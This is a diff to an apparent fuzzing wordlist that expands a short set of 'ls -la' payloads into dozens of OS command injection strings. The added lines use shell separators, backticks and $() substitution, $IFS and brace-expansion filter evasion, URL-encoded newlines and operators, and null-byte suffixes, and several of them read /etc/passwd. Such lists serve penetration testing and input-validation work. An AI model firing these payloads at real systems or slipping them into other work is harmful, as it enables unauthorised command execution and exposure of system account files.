@@ -1,16 +1,78 @@
-; ls -la
-& ls -la
-| ls -la
-|| ls -la
-&& ls -la
-`ls -la`
-$(ls -la)
-;ls -la;
-|ls${IFS}-la
-;{ls,-la}
-;ls$IFS-la
+;id
+&&id
+||id
+|id
+`id`
+$(id)
+;id;
+&&id&&
+||id||
+|id|
+; id;
+&& id &&
+|| id ||
+| id |
+;id #
+&&id #
+||id #
+|id #
+;${IFS}id
+&&${IFS}id
+||${IFS}id
+;$IFS$9id
+;&& id
+;|| id
+;|id
+;& id
+&id
+^id
+;a=id;$a
+;X=id;$X
+;$(echo id)
+;`echo id`
+;id 2>&1
+;id 2>/dev/null
+;id > /tmp/x
+;id | tee /tmp/x
+;(id)
+;{id}
+;{id,}
+;{id;}
+%0aid
 %0als
-%0als -la
+%0awhoami
+%0auname%20-a
+%0d%0aid
+
+id
+
+id
+
+
+id
+%0a%09id
 %0a id
-\nid
-\n id
+;%20id
+;%09id
+%3bid
+%7cid
+%26id
+%60id%60
+%24%28id%29
+%3b%20id
+%7c%20id
+%26%26%20id
+;id%00
+;id%00.png
+;id;echo
+;echo${IFS}test
+;cat${IFS}/etc/passwd
+;cat${IFS}/etc${IFS}passwd
+;cat</etc/passwd
+;cat<>/etc/passwd
+;{cat,/etc/passwd}
+;"id"
+;'id'
+;\`id\`
+;${IFS}cat${IFS}/etc/passwd
+;IFS=,;cat,/etc/passwd
